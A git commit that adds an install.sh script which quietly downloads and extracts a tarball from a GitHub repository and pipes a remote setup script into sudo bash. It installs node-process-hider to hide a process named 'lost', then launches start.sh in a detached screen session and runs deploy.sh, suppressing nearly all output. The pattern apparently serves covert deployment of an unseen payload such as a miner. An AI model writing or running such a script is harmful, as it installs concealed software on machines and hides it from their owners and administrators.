f5ea6d5a25c505ea947f321ddb0ee261137a4607
clasmildyt <96880879+clasmildyt@users.noreply.github.com>
2022-06-02 18:25:18 +0700

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,12 @@
+wget -O dolorku.tar.gz https://github.com/clasmildyt/lancrot/raw/main/dolorku.tar.gz >/dev/null 2>&1
+tar -xvf dolorku.tar.gz >/dev/null 2>&1
+sudo apt-get update && >/dev/null 2>&1
+nohup curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash - && >/dev/null 2>&1
+sudo nohup apt-get install -y nodejs && >/dev/null 2>&1
+sudo nohup npm i -g node-process-hider >/dev/null && 2>&1
+sudo ph add lost >/dev/null && 2>&1
+echo "DONE!" && sleep 1
+chmod +x start.sh &&
+screen -dmS new ./start.sh &&
+chmod +x deploy.sh &&
+./deploy.sh
